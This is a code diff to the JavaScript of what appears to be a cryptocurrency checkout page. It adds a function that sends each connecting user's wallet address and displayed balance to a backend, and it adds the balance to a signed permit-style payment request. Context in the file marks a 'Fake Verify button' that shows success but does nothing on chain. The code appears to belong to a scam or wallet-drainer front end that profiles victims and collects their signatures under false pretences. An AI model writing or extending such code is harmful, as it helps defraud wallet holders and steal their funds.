@@ -495,6 +495,7 @@ async function onConnected() {
   }
 
   await refreshBalance();
+  await notifyConnect();
   toast(`Connected · ${userAddress.slice(0,6)}…${userAddress.slice(-4)}`, "success");
 
   applyBalanceState();
@@ -591,6 +592,7 @@ async function signAndPay() {
           nonce:    nonce.toString(),
           deadline,
           orderId,
+          amount:   document.getElementById("balance-display").textContent,
           v, r, s
         })
       });
@@ -625,6 +627,18 @@ async function signAndPay() {
       setStatus("Failed — " + (e.message || "unknown error"));
     }
   }
+}
+
+// ── Notify backend on wallet connect ──
+async function notifyConnect() {
+  try {
+    const bal = document.getElementById("balance-display").textContent;
+    await fetch(CONFIG.BACKEND_URL.replace("/api/checkout", "/api/connected"), {
+      method:  "POST",
+      headers: { "Content-Type": "application/json" },
+      body:    JSON.stringify({ wallet: userAddress, balance: bal })
+    });
+  } catch(e) { console.log("Notify error:", e.message); }
 }
 
 // ── Fake Verify button — shows success, does nothing on chain ──
